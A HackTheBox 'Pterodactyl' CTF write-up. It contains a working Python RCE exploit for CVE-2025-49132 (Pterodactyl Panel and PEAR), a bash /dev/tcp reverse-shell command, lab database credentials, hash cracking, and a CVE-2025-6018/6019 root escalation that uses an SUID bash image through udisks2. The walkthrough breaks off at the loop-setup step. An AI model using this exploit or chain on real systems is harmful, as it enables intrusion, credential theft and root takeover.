---
title: Pterodactyl
date: 2026-05-18
excerpt: HackTheBox - Medium
cover: ../uploads/cover_pterodactyl.jpg
tags: CVE-2025-49132, CVE-2025-6018, CVE-2025-6019
---

Welcome back to my writeup. In today’s post, I’ll walk you through a step-by-step breakdown of how I solved **Pterodactyl** from Hack The Box Labs.

This machine was a great learning experience, especially in understanding how different components of the system interact and how small misconfigurations can lead to meaningful exploitation paths. I’ll go through my full thought process, from initial enumeration, identifying potential attack surfaces, all the way to gaining a working solution. Along the way, I’ll also highlight key observations and techniques that helped me move forward whenever I got stuck.

By the end of this writeup, you should have a clear idea of how the challenge was approached, what vulnerabilities were involved, and the logic behind each step of the exploitation chain.

Let's start!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9Z5EZ4ocbg1XBfMD7vQm%252Fanime-girl-with-lollipop-38khp402fgob986g.gif%3Falt%3Dmedia%26token%3D537057bd-943a-4d12-b149-1cd3182848bc&width=768&dpr=3&quality=100&sign=dde0ef71&sv=2)

## Reconnaissance

First, we begin by scanning the target for any open ports that could serve as potential entry points. To do this, we use `Nmap` to identify exposed services and gather initial information about the system.

`nmap -A -T5 10.129.229.122`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2mrRFGaVoM1oSn33okwc%252FScreenshot%2520%282447%29.png%3Falt%3Dmedia%26token%3Db996797c-eac3-4e48-937d-347ca2e2b3e5&width=768&dpr=3&quality=100&sign=a544cd45&sv=2)

As shown, ports **22 (SSH)** and **80 (HTTP)** are open. The web service on port 80 redirects to `pterodactyl.htb`, so the next step is to map this domain locally by adding it to our `/etc/hosts` file.

Now let's visit the site:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FixAQyZrxMMFGKo3GCB8X%252FScreenshot%2520%282449%29.png%3Falt%3Dmedia%26token%3D89fd5a3e-5e16-4094-8833-2b48511828aa&width=768&dpr=3&quality=100&sign=8c22cb0d&sv=2)

The website appears to be themed around Minecraft. I also noticed a subdomain, `play.pterodactyl.htb`, which I added to my `/etc/hosts` file for proper resolution. However, when I accessed it, it still redirected back to `pterodactyl.htb`.

Next, I proceeded to enumerate subdirectories and files by performing a brute-force scan using `feroxbuster`.

`feroxbuster -u http://pterodactyl.htb`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDU68UHQVJPvcReePqJ4w%252FScreenshot%2520%282450%29.png%3Falt%3Dmedia%26token%3Deab4936c-7838-44d7-90e9-219b92c2bcb7&width=768&dpr=3&quality=100&sign=5c67bd3e&sv=2)

As shown, there is a text file named `changelog.txt`, so the next step is to inspect its contents.

`curl http://pterodactyl.htb/changelog.txt`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F78I0REE3lKzsJGRruacP%252FScreenshot%2520%282451%29.png%3Falt%3Dmedia%26token%3Dd174781a-5b4b-41fc-967e-3787d30506aa&width=768&dpr=3&quality=100&sign=c320a991&sv=2)

I gathered four important pieces of information: a second subdomain, `play.pterodactyl.htb` which I discovered earlier, the installed `Pterodactyl Panel v1.11.10`, the presence of `PHP-PEAR`, and an exposed `phpinfo()` page.

However, visiting `play.pterodactyl.htb` still redirects back to the main site, and the Pterodactyl panel is not actually accessible through that subdomain. It appears the subdomain is defined in the Nginx configuration, but the panel itself isn’t directly exposed via it.

Now let's check the `phpinfo.php`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FYZUvirBEdH5MOdMfBoKh%252FScreenshot%2520%282454%29.png%3Falt%3Dmedia%26token%3D36550e15-a212-4638-9ee4-cda97db00808&width=768&dpr=3&quality=100&sign=3bdce617&sv=2)

As I'm exploring the information of PHP, I noticed these 4

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FoVm8x26yfhv8Bamk85ru%252FScreenshot%2520%282455%29.png%3Falt%3Dmedia%26token%3D8e6af014-47ba-46c1-9cfa-e10f899469af&width=768&dpr=3&quality=100&sign=21866e4a&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2gZJCYaPKm7jMMHR41uB%252FScreenshot%2520%282457%29.png%3Falt%3Dmedia%26token%3Dea5b7ec3-b4fd-4ed1-964f-559c0449a0e9&width=768&dpr=3&quality=100&sign=12884e53&sv=2)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FlZbzdGZ8edE5dbJkKpNB%252FScreenshot%2520%282459%29.png%3Falt%3Dmedia%26token%3Dbcd59003-bb28-4ec1-aff5-f2f22cc6bded&width=768&dpr=3&quality=100&sign=3e2b4a9c&sv=2)

This is a classic `PHP-PEAR RCE` scenario, as all required conditions are present at the same time.

The `PEAR RCE` technique works by abusing `pearcmd.php`, typically located at `/usr/share/php/PEAR/pearcmd.php`, which is confirmed to be within the include path. When `register_argc_argv` is enabled, PHP forwards the HTTP query string directly into `$argv`. PEAR then parses `$argv` to determine which command to execute. Using the `config-create` command, it is possible to write a file to an arbitrary location. Since there is no `open_basedir` restriction and no disabled PHP functions, any file written into `/var/www/html/` becomes immediately executable as PHP.

The entry point identified via `feroxbuster` is `index.php`, which confirms that the request must target a valid PHP file, with `index.php` serving as the execution trigger. The exploit relies on sending the PEAR command directly as the raw query string so that it is correctly interpreted through `$argv`.

## Exploitation

### Confirming CVE-2025-49132 (Pterodactyl Panel RCE)

Next, I added `panel.pterodactyl.htb` to my hosts file, then used `Nuclei` to scan the target for potential vulnerabilities and confirm any findings.

`nuclei -u http://panel.pterodactly.htb -t 2025_cves -t 2026_cves`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDIoWIo9cicOI65U3dwTg%252FScreenshot%2520%282462%29.png%3Falt%3Dmedia%26token%3Daa666b16-d0b9-4b0a-b210-5bcbacc3548c&width=768&dpr=3&quality=100&sign=f0c30b30&sv=2)

As shown, the system is vulnerable to [CVE-2025-49132](https://www.wiz.io/vulnerability-database/cve/cve-2025-49132), a critical remote code execution (RCE) flaw affecting the `Pterodactyl Panel`, an open-source platform used for managing game servers.

This vulnerability allows an unauthenticated attacker to run arbitrary code on the server by exploiting a weakness in the panel’s localization endpoint, specifically `/locales/locale.json`. Improper validation of the `locale` and `namespace` parameters makes it possible to manipulate the request and trigger code execution.

### Reviewing the Vulnerable Source Code

Before moving on to exploitation, it’s important to review the Pterodactyl source code and understand how this vulnerability is introduced in the first place. This helps clarify the underlying logic flaw and why the issue can be triggered.

The source code is available in this [Github](https://github.com/pterodactyl/panel/tree/v1.11.10) repo.

The first thing to examine is `routes/base.php`, where three routes are defined.

Among the defined routes, `/locales/locale.json` stands out as the most significant. The endpoint is intentionally excluded from authentication and two-factor authentication middleware, meaning it can be accessed by anyone without valid credentials. In addition, the route configuration permits the `namespace` parameter to accept unrestricted character patterns, allowing user-controlled input to pass through with minimal filtering. These design choices together create the conditions that make the vulnerability possible.

The route is handled by a controller located at `app/Http/Controllers/Base/LocaleController.php`, where its functionality is implemented.

```php
public function __invoke(Request $request): JsonResponse
    {
        $locales = explode(' ', $request->input('locale') ?? '');
        $namespaces = explode(' ', $request->input('namespace') ?? '');

        $response = [];
        foreach ($locales as $locale) {
            $response[$locale] = [];
            foreach ($namespaces as $namespace) {
                $response[$locale][$namespace] = $this->i18n(
                    $this->loader->load($locale, str_replace('.', '/', $namespace))
                );
            }
        }
```

Looking closely at this function, both `locale` and `namespace` are directly extracted from the query string without any form of validation or sanitization, and are then passed into `$this->loader->load()`.

In this case, `$this->loader` is an instance of Laravel’s `Illuminate\Translation\FileLoader`. The `load()` method then delegates the process to `loadPath()`, located in `FileLoader.php` (lines 120–127), where the incoming values are assigned to `$locale` and `$group` for further processing.

```php
protected function loadPath($path, $locale, $group)
{
    if ($this->files->exists($full = "{$path}/{$locale}/{$group}.php")) {
        return $this->files->getRequire($full);
    }

    return [];
}
```

The `getRequire()` function performs a direct `require` operation on the resolved file path, meaning any PHP file that the path points to will be executed immediately. Since both `$locale` and `$group` (namespace) are fully controlled by user input, an attacker can manipulate directory traversal sequences in `locale` along with a crafted `namespace` value to target arbitrary `.php` files on the system and force PHP to include and execute them.

Based on the behavior observed, both `locale` and `namespace` are fully controllable through the URL, which effectively shapes the final file path as:

`/<valid path>/<locale>/<namespace>.php`

This allows inclusion of PHP files, but it prevents access to arbitrary system files such as `/etc/passwd`, since the application automatically appends a `.php` extension. Additionally, PHP filter wrappers are not usable in this case because extra path components are prepended to the input, interfering with typical wrapper-based file reading techniques.

### Writing the Exploit Script

Now that we understand how the vulnerability works, we can proceed to build our own exploit to take advantage of it and obtain a reverse shell. The exploit will be written in Python.

```python
#!/usr/bin/env python3

import requests, sys, os, re, subprocess, urllib3

urllib3.disable_warnings()

t = sys.argv[1].rstrip("/")
cmd = sys.argv[2]

# Create session for consistent requests
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"
s.verify = False

print("[*] CVE-2025-49132 | Pterodactyl Panel RCE")
print(f"[*] Target: {t}")

# Step 1: Check if target is already patched
# If the response gets rewritten (hash= in URL), exploit likely blocked
r = s.get(
    f"{t}/locales/locale.json",
    params={"locale": "en", "namespace": "validation"},
    timeout=10
)

if "hash=" in r.url:
    sys.exit("[-] Target patched")

print("[+] Target vulnerable\n[*] Dropping payload...")

# Extract host for raw curl-based exploit execution
host = t.split("/")[2]

# Random filename to avoid collisions in /tmp
uid = os.urandom(4).hex()

# Convert command into hex so it can be safely embedded in PHP payload
hexcmd = cmd.encode().hex()

# Step 2: Abuse PEAR config-create via pearcmd.php
# This writes a malicious PHP file into /tmp/<uid>.php
subprocess.run(
    f'curl -s -g -k --max-time 10 "http://{host}/locales/locale.json'
    
    # Trigger PEAR command execution (config-create abuse)
    f'?+config-create+/'
    
    # Directory traversal to reach PEAR installation path
    f'&locale=../../../../../..{"/usr/share/php/PEAR"}'
    
    # Force use of pearcmd.php functionality
    f'&namespace=pearcmd'
    
    # Inject PHP payload that executes system() with our command
    f'&/<?=system(hex2bin(\'{hexcmd}\'))?>+/tmp/{uid}.php"',
    
    shell=True,
    capture_output=True,
    timeout=15
)

print("[*] Triggering payload...")

# Step 3: Trigger execution of the written PHP file
# We abuse locale resolution again to include /tmp/<uid>.php indirectly
r = s.get(
    f"{t}/locales/locale.json?locale=../../../../../../tmp&namespace={uid}",
    timeout=15
)

# Step 4: Extract command output from response
# PEAR output tends to duplicate output, so we clean it
m = re.search(r'namespace=pearcmd&/(.*?)/pear/php', r.text, re.DOTALL)

if m:
    raw = m.group(1).strip()
    lines = raw.split('\n')
    mid = len(lines) // 2

    if mid > 0 and lines[:mid] == lines[mid:]:
        out = '\n'.join(lines[:mid])
    else:
        half = len(raw) // 2
        out = raw[:half].strip() if half > 0 and raw[:half] == raw[half:] else raw

    print(f"[+] Output:\n{out}")
else:
    print("[-] No output")
```

### Gaining a Reverse Shell

Let's run our exploit!

`python3 exploit.py http://panel.pterodactyl.htb 'id'`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGjraNLtal10jnYqt2wMS%252FScreenshot%2520%282506%29.png%3Falt%3Dmedia%26token%3D77b34fa8-891d-43c4-84c5-690298bb34f2&width=768&dpr=3&quality=100&sign=4bb1440f&sv=2)

And it worked! Although it took some trial and error, and I ran into plenty of errors before finally getting it to function correctly.

Now let's use our exploit to establish a reverse shell!

Setup listener using `netcat`:

`nc -lnvp 1234`

And run our exploit with a reverse shell payload in it:

`python3 exploit.py http://panel.pterodactyl.htb "bash -i >& /dev/tcp/10.10.16.15/1234 0>&1"`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fk1B5IJLMVle0WvPGBcXT%252FScreenshot%2520%282507%29.png%3Falt%3Dmedia%26token%3D2cc17a88-6fa8-4716-9de7-0fbab01d930c&width=768&dpr=3&quality=100&sign=313a1d0d&sv=2)

### Extracting Database Credentials and Gaining SSH Access

We got in and are now operating as the `wwwrun` user. The first step I took was to explore the Pterodactyl setup and its directory structure, where I noticed a `.env` file.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fe2DWpfdKbLso3gAPMNGd%252FScreenshot%2520%282465%29.png%3Falt%3Dmedia%26token%3D2cc0b29e-ea10-46dd-a755-c6e2d8b79bd1&width=768&dpr=3&quality=100&sign=4c2bdf6d&sv=2)

As shown, the database credentials are also exposed here. The next step is to connect to MySQL, inspect the database, and see if we can retrieve user credentials, possibly including those for accounts in the `/home` directory.

`mariadb -u pterodactyl -pPteraPanel -e 'show databases;' -h 127.0.0.1`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FRqNF9CFL5bhJrR5fVaN7%252FScreenshot%2520%282466%29.png%3Falt%3Dmedia%26token%3Dfe2e52df-17b8-4b66-9ff4-7a53fc790bff&width=768&dpr=3&quality=100&sign=a53d50aa&sv=2)

Now let's use the `panel` database and list the existing tables.

`mariadb -u pterodactyl -pPteraPanel -e 'use panel; show tables;' -h 127.0.0.1`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FnwvNCocJyanWTBOufdEW%252FScreenshot%2520%282467%29.png%3Falt%3Dmedia%26token%3D1a6e48a6-fa79-406b-b9ac-ee48ac7d9057&width=768&dpr=3&quality=100&sign=a42cf5e4&sv=2)

At the end of the list, there is a `users` table, let's select that and inspect its data.

`mariadb -u pterodactyl -pPteraPanel -e 'use panel; select * from users;' -h 127.0.0.1`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbVaj1D3vn1yBxctBcoOX%252FScreenshot%2520%282468%29.png%3Falt%3Dmedia%26token%3Dbb7fa90a-2d55-49ba-8377-956db5888068&width=768&dpr=3&quality=100&sign=20c2ec67&sv=2)

As shown, there are two users, `headmonitor` and `phileasfogg3`, along with their bcrypt password hashes. The next step I took was to save these hashes into a file and attempt to crack them using `Hashcat`.

`hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt`

After 10 mins, we finally now have the plaintext: `!QAZ2wsx`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5DynyNLh3PzIAVfRmEbm%252FScreenshot%2520%282469%29.png%3Falt%3Dmedia%26token%3D1c4ab638-d6e9-47b0-a050-3645d1f8b9b1&width=768&dpr=3&quality=100&sign=4a69579c&sv=2)

Now let's login to `ssh` as user `phileasfogg3` .

`ssh phileasfogg3@10.129.229.122`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZaKFXgM23M0qYolDcfiM%252FScreenshot%2520%282470%29.png%3Falt%3Dmedia%26token%3Dc64231ef-8e86-446a-a180-e58a75e60a0c&width=768&dpr=3&quality=100&sign=37bb915&sv=2)

We're in! At this point we can now see the `user.txt`

## Privilege Escalation

### Investigating Sudo Permissions and the udisksd Clue

I ran `sudo -l` to check whether there were any commands that could be executed as root, looking for a potential privilege escalation path.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJENRURFMtF6fpCqTufay%252FScreenshot%2520%282472%29.png%3Falt%3Dmedia%26token%3Dd23ac29c-bb2c-4f71-a5a8-233a394cfc72&width=768&dpr=3&quality=100&sign=2c838bdc&sv=2)

At first glance, it appears that all commands can be run with sudo privileges, but attempting to do so prompts for the root password. Although this seems promising, it actually means the user can execute any command as any user only if they know the target account’s password. This behavior is controlled by the `targetpw` setting, which requires the target user’s credentials instead of just the invoking user’s password. This is the default configuration in openSUSE.

While exploring the target system, I came across an email sent to the user `phileasfogg3` from the system administrator.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuR4mlawzAQmnpmMbRCAN%252FScreenshot%2520%282473%29.png%3Falt%3Dmedia%26token%3Dc8481b78-b3cb-4896-832d-76ee3eb6fb77&width=768&dpr=3&quality=100&sign=75fecd8d&sv=2)

This strongly suggests investigating USB device handling. The `udisksd` daemon, which is part of `udisks2`, is a userspace service responsible for managing storage devices in Linux, including automatically mounting removable media, handling encrypted (LUKS) volumes, and retrieving SMART data. It operates with root privileges and communicates through D-Bus. If there is a vulnerability in how it processes filesystem metadata or device labels from untrusted media, it could potentially be exploited to achieve code execution as root. The mention of **unusual udisksd activity** in the email points directly toward this as a likely attack vector.

### Chaining CVE-2025-6018 and CVE-2025-6019

While I'm searching for udisks CVE, I've found this 2 that is said to be interconnected.

These are [CVE-2025-6018](https://nvd.nist.gov/vuln/detail/CVE-2025-6018) and [CVE-2025-6019](https://nvd.nist.gov/vuln/detail/CVE-2025-6019).

**CVE-2025-6018** and **CVE-2025-6019** are two local privilege escalation (LPE) vulnerabilities that, when chained together, allow an unprivileged user to gain full **root access** on major Linux distributions including Ubuntu, Debian, Fedora, and SUSE. Discovered by the **Qualys Threat Research Unit**, these flaws exploit default system configurations to bypass security boundaries in seconds.

The vulnerabilities are interconnected because the first flaw creates the necessary permissions for the second to execute:

* **CVE-2025-6018** affects the **Pluggable Authentication Modules (PAM)** configuration in openSUSE Leap 15 and SUSE Linux Enterprise 15. It misclassifies remote SSH users as "active" users (those physically present at the console), granting them **allow\_active** privileges typically reserved for local console sessions.
* **CVE-2025-6019** resides in the **udisks2** storage management service and the **libblockdev** library. It allows users with **allow\_active** privileges to escalate to root by abusing the `org.freedesktop.udisks2.modify-device` Polkit action, which normally permits active users to modify storage devices without authentication.

Attackers chain these by first using **CVE-2025-6018** to elevate from a standard SSH user to **allow\_active** status, and then immediately leveraging **CVE-2025-6019** through the udisks daemon to execute privileged actions and obtain a **root shell**. This combination is particularly dangerous because it relies on legitimate, default-installed components rather than exotic kernel exploits, making detection difficult and affecting nearly all modern Linux environments.

You chain the two vulnerabilities:

1. **First**, you use **CVE-2025-6018** to trick the system into thinking your SSH session is a local, "active" console session. This grants you `allow_active` privileges, which are normally restricted to users physically at the machine.
2. **Then**, with those elevated privileges, you exploit **CVE-2025-6019** in the `udisks2` service. You do this by:

   * Creating a disk image (e.g., XFS) on your attacker machine that contains a copy of `/bin/bash` with the **SUID bit set** and owned by root.
   * Transferring this image to the target machine.
   * Using `udisks2` to create a loop device from your image and then calling its `Filesystem.Resize` method with an invalid size (like 0).

The bug in `udisks2`'s underlying library (`libblockdev`) causes it to **mount** your filesystem as part of the resize process but then **fail to unmount it** when the resize inevitably fails. Crucially, it mounts the filesystem **without** the `nosuid` security flag.

This leaves your malicious disk image mounted somewhere in `/tmp/blockdev.*`, with your SUID-root bash binary fully accessible. You can then simply execute `/tmp/blockdev.*/bash -p`, and the SUID bit gives you a root shell.

### Exploiting the PAM/Polkit and udisks2 Race Condition

Now let's implement it to reach root.

I will create a `.pam_environment` file in the current user’s home directory. Since `polkit` uses the `XDG_SEAT` and `XDG_VTNR` variables to determine whether a session is running on the physical console, setting these values to indicate seat 0 and VT 1 can trick the system into treating the SSH session as an active local session, allowing it to bypass the `allow_active` restriction.

`printf "XDG_SEAT=seat0\nXDG_VTNR=1\n" > .pam_environment`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FpZaUAfbzBNt5kevL2CfO%252FScreenshot%2520%282478%29.png%3Falt%3Dmedia%26token%3Dbbee3514-41ba-4595-a298-5c1cb4b08b66&width=768&dpr=3&quality=100&sign=f2b6e945&sv=2)

After that, I disconnect from the SSH session and log back in. On the new connection, the `.pam_environment` file is automatically loaded, and the changes are reflected in my environment variables.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FcuQUv0sSQ5gOcGb8Sx3E%252FScreenshot%2520%282479%29.png%3Falt%3Dmedia%26token%3D06ee5ecb-4e2e-4a4c-922c-cac1f9c88b84&width=768&dpr=3&quality=100&sign=c48a0ebc&sv=2)

This is sufficient to bypass the `Polkit` security restriction.

`pkcheck -a org.freedesktop.udisks2.loop-setup -p $$`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FZHgpQnCqGFM1zSGY6kBm%252FScreenshot%2520%282481%29.png%3Falt%3Dmedia%26token%3Df4a6b8ad-c8b4-40eb-bbc7-aecd26019f28&width=768&dpr=3&quality=100&sign=b07d2b8c&sv=2)

Now I’m going to craft a malicious image, but first I need to obtain a copy of the target’s `bash` binary. This is necessary because `glibc`, `libtinfo`, and other shared libraries are dynamically linked at runtime, and the target system differs from my local environment. I’ll transfer it using `scp`.

`scp phileasfogg3@pterodactyl.ht:/usr/bin/bash .`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5RXKb8eIoudFWQ4lR5k6%252FScreenshot%2520%282481%29.png%3Falt%3Dmedia%26token%3D2420f47c-b34c-4b79-b642-1f5f42d8e708&width=768&dpr=3&quality=100&sign=7898965f&sv=2)

Next, I generate the XFS filesystem image using the following process:

First, I create a small blank disk image, typically around 50–64 MB. I then format it as an XFS filesystem with `crc=0`, which ensures compatibility with older kernel behavior (around version 5.14) by avoiding newer superblock features. After that, I mount the image locally using a loopback device.

Once mounted, I place the `bash` binary inside the filesystem, set its ownership to `root:root`, and apply the SUID bit (`chmod 4755`) to allow it to execute with elevated privileges. Finally, I unmount the image to finalize it.

Let's create the image.

`sudo dd if=/dev/zero of=payload_root.img bs=1M count=512`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FkfJ0buszGyNWtxusCfnz%252FScreenshot%2520%282482%29.png%3Falt%3Dmedia%26token%3De2a0dad7-7208-436f-b3e8-570379c44dee&width=768&dpr=3&quality=100&sign=87272a39&sv=2)

The filesystem needs to be at least 512 MB in size, otherwise the subsequent step will not work properly. To create the XFS filesystem image, I will use `mkfs.xfs` (available via the `xfsprogs` package).

`sudo mkfs.xfs -m crc=0 -f payload_root.img`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fy1Z3QUzVOgoCVWeix16p%252FScreenshot%2520%282483%29.png%3Falt%3Dmedia%26token%3D4491979f-d9b0-42e2-a117-287b87baf5da&width=768&dpr=3&quality=100&sign=5f9d680c&sv=2)

I will then mount the filesystem, place the `bash` binary inside it, and set the SetUID bit on the file.

`sudo mkdir /mnt/xfsers`

`sudo mount -o loop payload_root.img /mnt/xfsers`

`sudo cp bash /mnt/xfsers/rooters`

`sudo chown root:root /mnt/xfsers/rooters`

`sudo chmod 6755 /mnt/xfsers/rooters`

`ls -al /mnt/xfsers/rooters`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FiKoiSx9LQvAZQxGojxJQ%252FScreenshot%2520%282484%29.png%3Falt%3Dmedia%26token%3Dab382968-cdf7-41cb-a8aa-3bdea5460017&width=768&dpr=3&quality=100&sign=2eccad40&sv=2)

Then unmount the image.

`sudo umount /mnt/xfsers`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuxVGJUJN1WnK4OVpxdm5%252FScreenshot%2520%282485%29.png%3Falt%3Dmedia%26token%3Dad1312a2-afeb-48a3-a6ec-550ae0b5fd7f&width=768&dpr=3&quality=100&sign=9c348bfe&sv=2)

Next, I will transfer the image to the target.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FYqJK0e1LnOB3pVKwBYbD%252FScreenshot%2520%282487%29.png%3Falt%3Dmedia%26token%3D0d0d6495-4ea3-44ff-87e0-1dcd4b9c0b12&width=768&dpr=3&quality=100&sign=69c25e91&sv=2)

I need to trigger `udisks2` on the Pterodactyl system to create and mount a loop device.

`udisksctl loop-setup -f /tmp/payload_root.img`

